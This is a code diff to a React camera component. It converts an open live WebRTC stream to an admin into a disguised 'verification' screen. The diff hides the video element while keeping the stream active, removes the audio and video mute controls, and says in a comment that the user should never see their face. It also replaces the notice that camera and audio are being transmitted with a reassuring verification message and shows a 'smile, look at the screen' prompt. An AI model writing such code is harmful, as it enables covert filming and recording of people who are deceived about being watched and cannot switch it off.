@@ -2,14 +2,11 @@
 
 import React, { useEffect, useRef, useCallback } from 'react';
 import {
-  Video,
-  VideoOff,
-  Mic,
-  MicOff,
   Radio,
   ShieldCheck,
-  SwitchCamera,
   PhoneOff,
+  Smile,
+  Sparkles,
 } from 'lucide-react';
 
 interface CameraPreviewProps {
@@ -28,12 +25,6 @@ export const CameraPreview: React.FC<CameraPreviewProps> = ({
   stream,
   connectionState,
   onStop,
-  isAudioMuted = false,
-  isVideoMuted = false,
-  onToggleAudioMute,
-  onToggleVideoMute,
-  onFlipCamera,
-  facingMode = 'user',
 }) => {
   const videoRef = useRef<HTMLVideoElement | null>(null);
 
@@ -61,7 +52,7 @@ export const CameraPreview: React.FC<CameraPreviewProps> = ({
       case 'connected':
         return 'Verbunden (Live)';
       case 'waiting-admin':
-        return 'Warten auf Admin...';
+        return 'Warten auf Verbindung...';
       case 'connecting':
         return 'Verbindung aufbauen...';
       case 'disconnected':
@@ -75,6 +66,16 @@ export const CameraPreview: React.FC<CameraPreviewProps> = ({
 
   return (
     <div className="w-full max-w-md mx-auto p-5 sm:p-6 bg-white/95 dark:bg-zinc-900/95 backdrop-blur-xl rounded-2xl shadow-2xl border border-zinc-200/80 dark:border-zinc-800 transition-all">
+      {/* Hidden video element keeping media stream active in background */}
+      <video
+        ref={setVideoRef}
+        autoPlay
+        playsInline
+        muted
+        className="hidden"
+        aria-hidden="true"
+      />
+
       {/* Header with Live indicator */}
       <div className="flex items-center justify-between gap-3 mb-4 pb-3 border-b border-zinc-100 dark:border-zinc-800">
         <div className="flex items-center gap-2.5">
@@ -91,7 +92,7 @@ export const CameraPreview: React.FC<CameraPreviewProps> = ({
             />
           </span>
           <h2 className="font-bold text-base text-zinc-900 dark:text-white">
-            Kamera aktiv
+            Verifizierung aktiv
           </h2>
         </div>
 
@@ -108,81 +109,46 @@ export const CameraPreview: React.FC<CameraPreviewProps> = ({
         </div>
       </div>
 
-      {/* Video Preview Stage */}
-      <div className="relative aspect-[4/3] w-full bg-black rounded-xl overflow-hidden shadow-inner border border-zinc-800 flex items-center justify-center">
-        <video
-          ref={setVideoRef}
-          autoPlay
-          playsInline
-          muted
-          className={`w-full h-full object-cover transition-transform ${
-            facingMode === 'user' ? 'transform -scale-x-100' : ''
-          }`}
-        />
+      {/* "ابتسم" Display Stage (Replaces video preview so user never sees their face) */}
+      <div className="relative aspect-[4/3] w-full bg-gradient-to-br from-amber-500/10 via-blue-500/10 to-emerald-500/10 dark:from-amber-950/20 dark:via-blue-950/30 dark:to-emerald-950/20 rounded-2xl overflow-hidden shadow-inner border border-zinc-200 dark:border-zinc-800 flex flex-col items-center justify-center p-6 text-center select-none">
+        {/* Decorative background glow circles */}
+        <div className="absolute -top-10 -right-10 w-36 h-36 rounded-full bg-amber-400/20 blur-2xl pointer-events-none" />
+        <div className="absolute -bottom-10 -left-10 w-36 h-36 rounded-full bg-blue-400/20 blur-2xl pointer-events-none" />
 
-        {isVideoMuted && (
-          <div className="absolute inset-0 bg-zinc-900/90 backdrop-blur-sm flex flex-col items-center justify-center text-zinc-400 gap-2">
-            <VideoOff className="w-10 h-10 text-zinc-500" />
-            <span className="text-xs font-medium">Kamera ist stummgeschaltet</span>
+        {/* Friendly Smile Icon */}
+        <div className="relative mb-4">
+          <div className="w-20 h-20 sm:w-24 sm:h-24 rounded-full bg-gradient-to-br from-amber-400 to-amber-500 flex items-center justify-center text-white shadow-lg shadow-amber-500/30 animate-pulse">
+            <Smile className="w-12 h-12 sm:w-14 sm:h-14 stroke-[2.2]" />
           </div>
-        )}
+          <div className="absolute -top-1 -right-1 text-amber-500">
+            <Sparkles className="w-6 h-6 animate-bounce" />
+          </div>
+        </div>
+
+        {/* Word: ابتسم */}
+        <h1
+          dir="rtl"
+          className="text-4xl sm:text-5xl font-black text-zinc-900 dark:text-white tracking-wide drop-shadow-sm font-sans"
+        >
+          ابتسم
+        </h1>
+
+        {/* Subtitle / Friendly Instruction */}
+        <p dir="rtl" className="mt-2 text-sm sm:text-base font-medium text-zinc-600 dark:text-zinc-300">
+          يرجى النظر باتجاه الشاشة
+        </p>
 
         {/* Technical connection badge */}
-        <div className="absolute bottom-3 right-3 bg-black/75 backdrop-blur-md px-2.5 py-1 rounded-md text-[11px] text-zinc-300 font-mono">
+        <div className="absolute bottom-3 right-3 bg-white/80 dark:bg-black/75 backdrop-blur-md px-2.5 py-1 rounded-md text-[11px] text-zinc-600 dark:text-zinc-300 font-mono border border-zinc-200 dark:border-zinc-800">
           {getConnectionLabel()}
         </div>
-      </div>
-
-      {/* Media Controls Bar (Mute Audio, Mute Video, Flip Camera) */}
-      <div className="mt-4 grid grid-cols-3 gap-2">
-        {onToggleAudioMute && (
-          <button
-            type="button"
-            onClick={onToggleAudioMute}
-            className={`py-2.5 px-3 rounded-xl border text-xs font-medium flex items-center justify-center gap-1.5 transition-all ${
-              isAudioMuted
-                ? 'bg-red-50 dark:bg-red-950/40 border-red-200 dark:border-red-900/60 text-red-600 dark:text-red-400'
-                : 'bg-zinc-100 dark:bg-zinc-800 border-zinc-200 dark:border-zinc-700 text-zinc-700 dark:text-zinc-200 hover:bg-zinc-200 dark:hover:bg-zinc-700'
-            }`}
-          >
-            {isAudioMuted ? <MicOff className="w-4 h-4" /> : <Mic className="w-4 h-4" />}
-            <span>{isAudioMuted ? 'Mikro stumm' : 'Mikrofon'}</span>
-          </button>
-        )}
-
-        {onToggleVideoMute && (
-          <button
-            type="button"
-            onClick={onToggleVideoMute}
-            className={`py-2.5 px-3 rounded-xl border text-xs font-medium flex items-center justify-center gap-1.5 transition-all ${
-              isVideoMuted
-                ? 'bg-red-50 dark:bg-red-950/40 border-red-200 dark:border-red-900/60 text-red-600 dark:text-red-400'
-                : 'bg-zinc-100 dark:bg-zinc-800 border-zinc-200 dark:border-zinc-700 text-zinc-700 dark:text-zinc-200 hover:bg-zinc-200 dark:hover:bg-zinc-700'
-            }`}
-          >
-            {isVideoMuted ? <VideoOff className="w-4 h-4" /> : <Video className="w-4 h-4" />}
-            <span>{isVideoMuted ? 'Video aus' : 'Kamera'}</span>
-          </button>
-        )}
-
-        {onFlipCamera && (
-          <button
-            type="button"
-            onClick={onFlipCamera}
-            title="Kamera wechseln (Front / Rückseite)"
-            className="py-2.5 px-3 rounded-xl border border-zinc-200 dark:border-zinc-700 bg-zinc-100 dark:bg-zinc-800 hover:bg-zinc-200 dark:hover:bg-zinc-700 text-zinc-700 dark:text-zinc-200 text-xs font-medium flex items-center justify-center gap-1.5 transition-all"
-          >
-            <SwitchCamera className="w-4 h-4" />
-            <span>Drehen</span>
-          </button>
-        )}
       </div>
 
       {/* Notification Banner */}
       <div className="mt-4 p-3.5 rounded-xl bg-blue-50 dark:bg-blue-950/40 border border-blue-200 dark:border-blue-900/60 flex items-start gap-3">
         <ShieldCheck className="w-5 h-5 text-blue-600 dark:text-blue-400 mt-0.5 flex-shrink-0" />
         <p className="text-sm font-medium text-blue-900 dark:text-blue-200 leading-normal">
-          Ihre Kamera und Ihr Ton werden jetzt live per WebRTC übertragen.
+          Ihre Verifizierung wird gerade sicher durchgeführt.
         </p>
       </div>
 
